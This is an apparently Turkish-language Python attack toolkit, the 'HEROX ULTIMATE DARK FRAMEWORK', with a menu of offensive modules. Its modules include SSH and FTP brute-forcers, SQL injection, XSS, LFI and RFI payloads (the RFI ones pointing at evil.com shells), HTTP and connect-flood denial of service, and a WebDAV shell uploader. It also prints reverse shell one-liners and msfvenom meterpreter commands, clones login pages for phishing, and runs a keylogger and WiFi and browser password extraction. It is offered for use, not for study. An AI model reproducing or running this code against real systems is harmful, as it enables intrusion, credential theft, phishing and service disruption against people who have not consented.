#!/usr/bin/env python3
import os, sys, time, json, socket, hashlib, base64, random, string, threading, subprocess, requests, re, shutil, zipfile, ipaddress, whois, dns.resolver, ftplib, smtplib, paramiko, telnetlib, urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urljoin

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'

print(f"""{Colors.RED}
╔═══════════════════════════════════════════════════════════════╗
║   ██╗  ██╗███████╗██████╗  ██████╗ ██╗  ██╗                  ║
║   ██║  ██║██╔════╝██╔══██╗██╔═══██╗╚██╗██╔╝                  ║
║   ███████║█████╗  ██████╔╝██║   ██║ ╚███╔╝                   ║
║   ██╔══██║██╔══╝  ██╔══██╗██║   ██║ ██╔██╗                   ║
║   ██║  ██║███████╗██║  ██║╚██████╔╝██╔╝ ██╗                  ║
║   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝                  ║
║                                                               ║
║   {Colors.WHITE}██████╗ ██╗   ██╗██╗████████╗██╗███╗   ███╗  ║
║   ██╔══██╗██║   ██║██║╚══██╔══╝██║████╗ ████║  ║
║   ██████╔╝██║   ██║██║   ██║   ██║██╔████╔██║  ║
║   ██╔══██╗██║   ██║██║   ██║   ██║██║╚██╔╝██║  ║
║   ██║  ██║╚██████╔╝██║   ██║   ██║██║ ╚═╝ ██║  ║
║   ╚═╝  ╚═╝ ╚═════╝ ╚═╝   ╚═╝   ╚═╝╚═╝     ╚═╝  ║
║                                                               ║
║   {Colors.CYAN}ULTIMATE DARK FRAMEWORK - TÜM MODÜLLER AKTİF{Colors.END}{Colors.RED}   ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.END}""")

def port_scanner():
    target = input("\n[?] Hedef IP: ")
    ports = input("[?] Portlar (örn: 21,22,80,443): ").split(',')
    print(f"\n{Colors.YELLOW}[+] Taranıyor: {target}{Colors.END}")
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex((target, int(port))) == 0:
                print(f"{Colors.GREEN}[+] {port} AÇIK{Colors.END}")
            sock.close()
        except: pass

def ftp_bruteforce():
    target = input("\n[?] FTP IP: ")
    users = ["admin", "root", "ftp", "user", "test", "anonymous"]
    pass_list = ["admin", "123456", "password", "ftp", "root", "12345", "password123", "admin123"]
    print(f"\n{Colors.YELLOW}[+] FTP Kırma Başladı{Colors.END}")
    for user in users:
        for pwd in pass_list:
            try:
                ftp = ftplib.FTP(target)
                ftp.login(user, pwd)
                print(f"{Colors.GREEN}[+] {user}:{pwd} -> BAŞARILI{Colors.END}")
                ftp.quit()
                return
            except: pass

def ssh_bruteforce():
    target = input("\n[?] SSH IP: ")
    users = ["root", "admin", "user", "test", "oracle", "postgres"]
    pass_list = ["root", "admin", "123456", "password", "toor", "12345", "password123"]
    print(f"\n{Colors.YELLOW}[+] SSH Kırma Başladı{Colors.END}")
    for user in users:
        for pwd in pass_list:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target, username=user, password=pwd, timeout=2)
                print(f"{Colors.GREEN}[+] {user}:{pwd} -> BAŞARILI{Colors.END}")
                ssh.close()
                return
            except: pass

def sql_injection_exploit():
    url = input("\n[?] Hedef URL (örn: http://site.com/page?id=1): ")
    payloads = ["' OR '1'='1' --", "' UNION SELECT NULL,NULL--", "' AND 1=1--", "' AND 1=2--", "' OR 1=1#"]
    print(f"\n{Colors.YELLOW}[+] SQL Injection Exploit Başladı{Colors.END}")
    for payload in payloads:
        test_url = url + payload
        try:
            r = requests.get(test_url, timeout=3)
            if "mysql" in r.text.lower() or "sql" in r.text.lower() or "error" in r.text.lower():
                print(f"{Colors.RED}[!] ZAFİYET BULUNDU! Payload: {payload}{Colors.END}")
            else:
                print(f"{Colors.GREEN}[+] {payload} -> Güvenli görünüyor{Colors.END}")
        except: pass

def xss_exploit():
    url = input("\n[?] Hedef URL (örn: http://site.com/search?q=test): ")
    payloads = ['<script>alert("XSS")</script>', '<img src=x onerror=alert(1)>', '<svg/onload=alert(1)>']
    print(f"\n{Colors.YELLOW}[+] XSS Exploit Başladı{Colors.END}")
    for payload in payloads:
        test_url = url.replace("test", payload)
        try:
            r = requests.get(test_url, timeout=3)
            if payload in r.text:
                print(f"{Colors.RED}[!] ZAFİYET BULUNDU! Payload: {payload}{Colors.END}")
            else:
                print(f"{Colors.GREEN}[+] {payload} -> Güvenli görünüyor{Colors.END}")
        except: pass

def lfi_exploit():
    url = input("\n[?] Hedef URL (örn: http://site.com/page.php?file=index): ")
    payloads = ["../../../../etc/passwd", "../../../../boot.ini", "../../../../windows/win.ini", "../../../../etc/hosts"]
    print(f"\n{Colors.YELLOW}[+] LFI Exploit Başladı{Colors.END}")
    for payload in payloads:
        test_url = url.replace("index", payload)
        try:
            r = requests.get(test_url, timeout=3)
            if "root:" in r.text or "[extensions]" in r.text or "127.0.0.1" in r.text:
                print(f"{Colors.RED}[!] ZAFİYET BULUNDU! Payload: {payload}{Colors.END}")
                print(r.text[:500])
            else:
                print(f"{Colors.GREEN}[+] {payload} -> Güvenli görünüyor{Colors.END}")
        except: pass

def rfi_exploit():
    url = input("\n[?] Hedef URL (örn: http://site.com/page.php?file=index): ")
    payloads = ["http://evil.com/shell.txt", "http://pastebin.com/raw/XXXXX", "https://raw.githubusercontent.com/evil/shell.txt"]
    print(f"\n{Colors.YELLOW}[+] RFI Exploit Başladı{Colors.END}")
    for payload in payloads:
        test_url = url.replace("index", payload)
        try:
            r = requests.get(test_url, timeout=3)
            if r.status_code == 200 and len(r.text) > 100:
                print(f"{Colors.RED}[!] ZAFİYET BULUNDU! Payload: {payload}{Colors.END}")
            else:
                print(f"{Colors.GREEN}[+] {payload} -> Güvenli görünüyor{Colors.END}")
        except: pass

def wp_admin_finder():
    target = input("\n[?] Hedef Site (örn: site.com): ")
    paths = ["wp-admin", "wp-login.php", "admin", "login", "wp-admin/admin.php", "wp-login"]
    print(f"\n{Colors.YELLOW}[+] Admin Bulucu Başladı{Colors.END}")
    for path in paths:
        test_url = f"http://{target}/{path}"
        try:
            r = requests.get(test_url, timeout=3)
            if r.status_code == 200:
                print(f"{Colors.GREEN}[+] {test_url} BULUNDU{Colors.END}")
            elif r.status_code == 403:
                print(f"{Colors.YELLOW}[!] {test_url} 403 (Erişim Engelli){Colors.END}")
        except: pass

def dir_bruteforce():
    target = input("\n[?] Hedef URL: ")
    wordlist = input("[?] Wordlist (default: dirs.txt): ") or "dirs.txt"
    if not os.path.exists(wordlist):
        with open(wordlist, "w") as f:
            f.write("\n".join(["admin", "backup", "uploads", "images", "css", "js", "inc", "includes", "config", "database", "sql", "dump", "old", "new", "test", "dev", "stage", "wp-content", "wp-includes"]))
    print(f"\n{Colors.YELLOW}[+] Dizin Taraması Başladı{Colors.END}")
    with open(wordlist, "r") as f:
        dirs = f.read().splitlines()
    for d in dirs:
        test_url = f"{target}/{d}"
        try:
            r = requests.get(test_url, timeout=3)
            if r.status_code == 200:
                print(f"{Colors.GREEN}[+] {test_url} (200){Colors.END}")
            elif r.status_code == 403:
                print(f"{Colors.YELLOW}[!] {test_url} (403){Colors.END}")
        except: pass

def ddos_http_flood():
    target = input("\n[?] Hedef URL: ")
    threads = int(input("[?] Thread: ") or "100")
    duration = int(input("[?] Süre (sn): ") or "30")
    def flood():
        while True:
            try:
                requests.get(target, timeout=1)
                requests.post(target, data={"x": random.randint(1,9999)})
            except: pass
    print(f"\n{Colors.RED}[!] HTTP Flood Başladı -> {target}{Colors.END}")
    for _ in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    time.sleep(duration)

def ddos_syn_flood():
    target = input("\n[?] Hedef IP: ")
    port = int(input("[?] Port: ") or "80")
    duration = int(input("[?] Süre (sn): ") or "30")
    def syn_flood():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target, port))
                sock.send(b"SYN")
                sock.close()
            except: pass
    print(f"\n{Colors.RED}[!] SYN Flood Başladı -> {target}:{port}{Colors.END}")
    for _ in range(100):
        threading.Thread(target=syn_flood, daemon=True).start()
    time.sleep(duration)

def webdav_upload():
    target = input("\n[?] WebDAV URL (örn: http://site.com/webdav/): ")
    shell = input("[?] Shell dosyası yolu (default: shell.php): ") or "shell.php"
    try:
        with open(shell, "rb") as f:
            data = f.read()
        r = requests.put(f"{target}/shell.php", data=data)
        if r.status_code in [201, 204]:
            print(f"{Colors.GREEN}[+] Shell yüklendi! {target}/shell.php{Colors.END}")
        else:
            print(f"{Colors.RED}[!] Yükleme başarısız{Colors.END}")
    except: pass

def cve_exploit():
    print(f"\n{Colors.YELLOW}[+] Hazır CVE Exploitleri{Colors.END}")
    print(f"{Colors.CYAN}1. CVE-2024-6387 (OpenSSH){Colors.END}")
    print(f"{Colors.CYAN}2. CVE-2024-4577 (PHP-CGI){Colors.END}")
    print(f"{Colors.CYAN}3. CVE-2023-7028 (GitLab){Colors.END}")
    print(f"{Colors.CYAN}4. CVE-2023-46805 (Ivanti){Colors.END}")
    choice = input("\n[?] Seçim: ")
    if choice == "1":
        print(f"{Colors.RED}[!] OpenSSH exploit çalıştırılıyor...{Colors.END}")
        os.system("python3 openssh_exploit.py")
    elif choice == "2":
        print(f"{Colors.RED}[!] PHP-CGI exploit çalıştırılıyor...{Colors.END}")
        os.system("python3 php_cgi_exploit.py")
    elif choice == "3":
        print(f"{Colors.RED}[!] GitLab exploit çalıştırılıyor...{Colors.END}")
        os.system("python3 gitlab_exploit.py")
    elif choice == "4":
        print(f"{Colors.RED}[!] Ivanti exploit çalıştırılıyor...{Colors.END}")
        os.system("python3 ivanti_exploit.py")

def reverse_shell_generator():
    ip = input("\n[?] Listen IP: ")
    port = input("[?] Listen Port: ")
    print(f"\n{Colors.YELLOW}[+] Reverse Shell Payloadları:{Colors.END}")
    print(f"{Colors.CYAN}1. Bash:{Colors.END} bash -i >& /dev/tcp/{ip}/{port} 0>&1")
    print(f"{Colors.CYAN}2. Python:{Colors.END} python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'")
    print(f"{Colors.CYAN}3. Netcat:{Colors.END} nc {ip} {port} -e /bin/sh")
    print(f"{Colors.CYAN}4. PHP:{Colors.END} php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
    print(f"{Colors.CYAN}5. Perl:{Colors.END} perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'")

def meterpreter_generator():
    ip = input("\n[?] Listen IP: ")
    port = input("[?] Listen Port: ")
    print(f"\n{Colors.YELLOW}[+] Meterpreter Payloadları:{Colors.END}")
    print(f"{Colors.CYAN}Windows:{Colors.END} msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o shell.exe")
    print(f"{Colors.CYAN}Linux:{Colors.END} msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o shell.elf")
    print(f"{Colors.CYAN}Android:{Colors.END} msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o shell.apk")
    print(f"{Colors.CYAN}Mac:{Colors.END} msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho")

def phishing_page_generator():
    print(f"\n{Colors.YELLOW}[+] Phishing Sayfası Oluşturucu{Colors.END}")
    target = input("[?] Hedef site (google, facebook, twitter, instagram): ").lower()
    sites = {
        "google": "https://accounts.google.com",
        "facebook": "https://www.facebook.com/login.php",
        "twitter": "https://twitter.com/login",
        "instagram": "https://www.instagram.com/accounts/login/"
    }
    if target in sites:
        print(f"{Colors.GREEN}[+] Phishing sayfası oluşturuluyor: {sites[target]}{Colors.END}")
        os.system(f"wget -O phishing.html {sites[target]}")
        print(f"{Colors.GREEN}[+] phishing.html kaydedildi. Düzenle ve sunucuya yükle.{Colors.END}")
    else:
        print(f"{Colors.RED}[!] Geçersiz site{Colors.END}")

def keylogger():
    print(f"\n{Colors.RED}[!] Keylogger başlatılıyor... (20 saniye){Colors.END}")
    import pynput.keyboard
    logs = ""
    def on_press(key):
        nonlocal logs
        try:
            logs += key.char
        except:
            logs += f" [{key}] "
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        time.sleep(20)
        listener.stop()
    print(f"{Colors.YELLOW}[+] Loglar:{Colors.END}\n{logs}")

def screen_capture():
    import pyautogui
    print(f"\n{Colors.YELLOW}[+] Ekran görüntüsü alınıyor...{Colors.END}")
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    print(f"{Colors.GREEN}[+] screenshot.png kaydedildi{Colors.END}")

def wifi_password_extractor():
    print(f"\n{Colors.YELLOW}[+] WiFi Şifreleri Çekiliyor...{Colors.END}")
    if os.name == 'nt':
        os.system("netsh wlan show profiles")
    else:
        os.system("sudo cat /etc/NetworkManager/system-connections/*")

def browser_password_extractor():
    print(f"\n{Colors.YELLOW}[+] Tarayıcı Şifreleri Çekiliyor...{Colors.END}")
    if os.name == 'nt':
        os.system("python3 browser_pass.py")
    else:
        os.system("python3 browser_pass.py")

def main_menu():
    while True:
        print(f"""
{Colors.CYAN}┌─────────────────────────────────────────────────────────────┐
│ {Colors.WHITE}HEROX ULTIMATE DARK FRAMEWORK{Colors.CYAN}                           │
├─────────────────────────────────────────────────────────────┤
│ {Colors.GREEN}1.{Colors.END}  Port Tarama           {Colors.GREEN}2.{Colors.END}  FTP Bruteforce         │
│ {Colors.GREEN}3.{Colors.END}  SSH Bruteforce        {Colors.GREEN}4.{Colors.END}  SQL Injection          │
│ {Colors.GREEN}5.{Colors.END}  XSS Exploit           {Colors.GREEN}6.{Colors.END}  LFI Exploit            │
│ {Colors.GREEN}7.{Colors.END}  RFI Exploit           {Colors.GREEN}8.{Colors.END}  Admin Finder           │
│ {Colors.GREEN}9.{Colors.END}  Dir Bruteforce        {Colors.GREEN}10.{Colors.END} HTTP Flood             │
│ {Colors.GREEN}11.{Colors.END} SYN Flood             {Colors.GREEN}12.{Colors.END} WebDAV Upload          │
│ {Colors.GREEN}13.{Colors.END} CVE Exploit           {Colors.GREEN}14.{Colors.END} Reverse Shell          │
│ {Colors.GREEN}15.{Colors.END} Meterpreter           {Colors.GREEN}16.{Colors.END} Phishing Page          │
│ {Colors.GREEN}17.{Colors.END} Keylogger             {Colors.GREEN}18.{Colors.END} Screen Capture         │
│ {Colors.GREEN}19.{Colors.END} WiFi Passwords        {Colors.GREEN}20.{Colors.END} Browser Passwords      │
│ {Colors.GREEN}0.{Colors.END}  Çıkış                                                 │
└─────────────────────────────────────────────────────────────┘
""")
        choice = input(f"{Colors.YELLOW}[?] Seçim: {Colors.END}")
        if choice == "0": break
        elif choice == "1": port_scanner()
        elif choice == "2": ftp_bruteforce()
        elif choice == "3": ssh_bruteforce()
        elif choice == "4": sql_injection_exploit()
        elif choice == "5": xss_exploit()
        elif choice == "6": lfi_exploit()
        elif choice == "7": rfi_exploit()
        elif choice == "8": wp_admin_finder()
        elif choice == "9": dir_bruteforce()
        elif choice == "10": ddos_http_flood()
        elif choice == "11": ddos_syn_flood()
        elif choice == "12": webdav_upload()
        elif choice == "13": cve_exploit()
        elif choice == "14": reverse_shell_generator()
        elif choice == "15": meterpreter_generator()
        elif choice == "16": phishing_page_generator()
        elif choice == "17": keylogger()
        elif choice == "18": screen_capture()
        elif choice == "19": wifi_password_extractor()
        elif choice == "20": browser_password_extractor()

if __name__ == "__main__":
    main_menu()
